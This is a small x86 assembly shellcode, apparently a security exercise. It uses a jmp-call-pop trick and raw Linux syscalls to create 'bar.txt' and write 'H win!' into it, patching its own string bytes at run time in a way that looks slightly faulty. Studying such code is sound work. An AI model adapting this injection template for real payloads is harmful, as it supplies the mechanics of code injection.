.global shellcode

shellcode:
    jmp ender

starter:

    xor %edx, %edx
    xor %ecx, %ecx
    xor %eax, %eax

    mov $0x124, %dx
    mov $0x42, %cl
    pop %ebx
    sub $0x1, 0x7(%ebx)
		add $0x1, 0x8(%ebx)
    mov $0x5, %al
    int $0x80

    
    xor %edx, %edx
    xor %ecx, %ecx
    mov $0x6, %dl
    add $0x8, %bl
    mov %ebx, %ecx
    mov %eax, %ebx
    mov $0x4, %al
    int $0x80

    ret

ender:
    call starter
    .string "bar.txt"
    .string "H win!"
